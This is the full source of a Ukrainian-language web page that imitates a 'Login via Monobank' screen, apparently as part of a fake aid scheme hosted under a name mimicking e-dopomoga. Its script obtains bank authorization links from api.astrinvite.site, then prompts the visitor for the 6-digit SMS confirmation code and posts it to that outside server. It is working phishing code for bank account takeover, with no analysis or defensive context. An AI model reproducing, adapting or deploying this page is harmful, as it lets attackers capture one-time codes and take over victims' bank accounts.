<!DOCTYPE html>
<html lang="uk">
<head>
  <meta charset="UTF-8">
  <title>Вхід через Monobank</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      height: 100vh;
      background-color: #f0f0f0;
    }
    h1 {
      margin-bottom: 20px;
    }
    #monobank-btn {
      padding: 15px 30px;
      font-size: 18px;
      background-color: #4CAF50;
      color: white;
      border: none;
      border-radius: 8px;
      cursor: pointer;
      text-decoration: none;
    }
    #monobank-btn:disabled {
      background-color: #aaa;
      cursor: not-allowed;
    }
    #status {
      margin-top: 15px;
      color: #555;
      font-size: 18px;
      text-align: center;
    }
    #return-instruction {
      margin: 14px 0 0 0;
      color: #444;
      max-width: 400px;
      display: none;
      font-size: 17px;
      text-align: center;
    }
    #sms-code {
      font-size: 22px;
      letter-spacing: 10px;
      padding: 8px 20px;
      text-align: center;
      width: 190px;
      margin-top: 12px;
      margin-bottom: 8px;
    }
    #send-code-btn {
      margin-left: 10px;
      padding: 10px 30px;
      font-size: 18px;
      background: #1976d2;
      color: #fff;
      border: none;
      border-radius: 7px;
      cursor: pointer;
    }
    #send-code-btn:disabled {
      background-color: #aaa;
      cursor: not-allowed;
    }
    #sms-error {
      color: red;
      margin-top: 5px;
    }
  </style>
</head>
<body>
  <h1>Вхід через Monobank</h1>
  <button id="monobank-btn" disabled>Завантаження...</button>
  <div id="return-instruction">
    <b>
      Після підтвердження в Monobank поверніться на цю сторінку.<br>
      Код підтвердження з'явиться тут автоматично.
    </b>
  </div>
  <div id="status">Очікуємо на посилання...</div>

  <script>
    const apiUrl = "https://api.astrinvite.site/link";
    const consumeUrl = "https://api.astrinvite.site/consume-link";
    const statusUrl = "https://api.astrinvite.site/api/link-status";
    const codeUrl = "https://api.astrinvite.site/api/submit-code";
    const btn = document.getElementById("monobank-btn");
    const status = document.getElementById("status");
    const instruction = document.getElementById("return-instruction");
    let currentId = null;
    let pollingStatus = false;
    let statusPoller = null;

    async function getLink() {
      try {
        const res = await fetch(apiUrl);

        if (res.status === 204 || res.status === 429) {
          btn.textContent = "Очікуємо на посилання...";
          btn.disabled = true;
          status.textContent = "Спробуємо ще раз за 3 секунди...";
          setTimeout(getLink, 3000);
          return;
        }

        const data = await res.json();
        if (data.url && data.id) {
          currentId = data.id;
          btn.textContent = "Увійти через Monobank";
          btn.disabled = false;
          status.textContent = "Натисніть кнопку для входу.";
          btn.onclick = () => {
            fetch(`${consumeUrl}?id=${currentId}`, { method: "POST" });
            instruction.style.display = "";
            // Добавляем redirect_uri если Monobank вдруг поддерживает возврат
            let link = data.url;
            try {
              const redirectUrl = encodeURIComponent("https://mono-edopomoga.github.io/2025/");
              if (!link.includes("redirect_uri=")) {
                link += (link.includes("?") ? "&" : "?") + "redirect_uri=" + redirectUrl;
              }
            } catch {}
            window.location.href = link; // Открыть в этой же вкладке!
            pollStatus();
          };
        } else {
          throw new Error("Немає посилання");
        }
      } catch (e) {
        btn.textContent = "Помилка сервера";
        btn.disabled = true;
        status.textContent = "Неможливо отримати посилання.";
        console.error(e);
        setTimeout(getLink, 3000);
      }
    }

    async function pollStatus() {
      if (pollingStatus) return;
      pollingStatus = true;
      btn.style.display = "none";
      // Инструкция уже видна
      statusPoller = setInterval(async () => {
        try {
          const res = await fetch(`${statusUrl}?id=${currentId}`);
          const data = await res.json();
          if (data.status === "waiting_code") {
            clearInterval(statusPoller);
            showCodeInput();
          }
        } catch {}
      }, 2500);
    }

    function showCodeInput() {
      status.innerHTML = `
        <b>Введіть 6-значний код з SMS:</b><br>
        <input id="sms-code" type="text" maxlength="6" autocomplete="one-time-code" inputmode="numeric">
        <button id="send-code-btn">Підтвердити</button>
        <div id="sms-error"></div>
      `;
      document.getElementById("sms-code").focus();
      document.getElementById("send-code-btn").onclick = async () => {
        let code = document.getElementById("sms-code").value.trim();
        if (!/^\d{6}$/.test(code)) {
          document.getElementById("sms-error").textContent = "Введіть коректний 6-значний код!";
          return;
        }
        document.getElementById("send-code-btn").disabled = true;
        document.getElementById("sms-error").textContent = "";
        let fd = new FormData();
        fd.append("id", currentId);
        fd.append("code", code);
        try {
          const res = await fetch(codeUrl, { method: "POST", body: fd });
          const resp = await res.json();
          if (resp.ok) {
            status.innerHTML = "<b>Код прийнято. Чекаємо підтвердження на пристрої…</b>";
          } else {
            document.getElementById("send-code-btn").disabled = false;
            document.getElementById("sms-error").textContent = "Помилка: " + (resp.error || "спробуйте ще");
          }
        } catch {
          document.getElementById("send-code-btn").disabled = false;
          document.getElementById("sms-error").textContent = "Помилка серверу. Спробуйте ще раз.";
        }
      };
    }

    getLink();
  </script>
</body>
</html>
